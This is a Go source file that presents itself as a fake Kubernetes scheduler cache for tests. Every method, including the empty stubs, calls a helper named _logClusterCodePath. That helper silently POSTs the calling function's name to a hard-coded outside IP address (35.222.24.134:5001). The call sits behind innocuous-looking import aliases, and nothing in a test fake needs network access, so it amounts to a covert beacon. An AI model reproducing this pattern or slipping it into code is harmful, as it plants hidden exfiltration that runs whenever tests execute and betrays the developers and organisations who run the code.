package fake

import (
 "k8s.io/api/core/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/kubernetes/pkg/scheduler/algorithm"
 schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
 schedulerinternalcache "k8s.io/kubernetes/pkg/scheduler/internal/cache"
)

type Cache struct {
 AssumeFunc       func(*v1.Pod)
 ForgetFunc       func(*v1.Pod)
 IsAssumedPodFunc func(*v1.Pod) bool
 GetPodFunc       func(*v1.Pod) *v1.Pod
}

func (c *Cache) AssumePod(pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c.AssumeFunc(pod)
 return nil
}
func (c *Cache) FinishBinding(pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) ForgetPod(pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c.ForgetFunc(pod)
 return nil
}
func (c *Cache) AddPod(pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) UpdatePod(oldPod, newPod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) RemovePod(pod *v1.Pod) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) IsAssumedPod(pod *v1.Pod) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.IsAssumedPodFunc(pod), nil
}
func (c *Cache) GetPod(pod *v1.Pod) (*v1.Pod, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.GetPodFunc(pod), nil
}
func (c *Cache) AddNode(node *v1.Node) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) UpdateNode(oldNode, newNode *v1.Node) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) RemoveNode(node *v1.Node) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) UpdateNodeNameToInfoMap(infoMap map[string]*schedulercache.NodeInfo) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (c *Cache) List(s labels.Selector) ([]*v1.Pod, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil, nil
}
func (c *Cache) FilteredList(filter algorithm.PodFilter, selector labels.Selector) ([]*v1.Pod, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil, nil
}
func (c *Cache) Snapshot() *schedulerinternalcache.Snapshot {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &schedulerinternalcache.Snapshot{}
}
func (c *Cache) NodeTree() *schedulerinternalcache.NodeTree {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
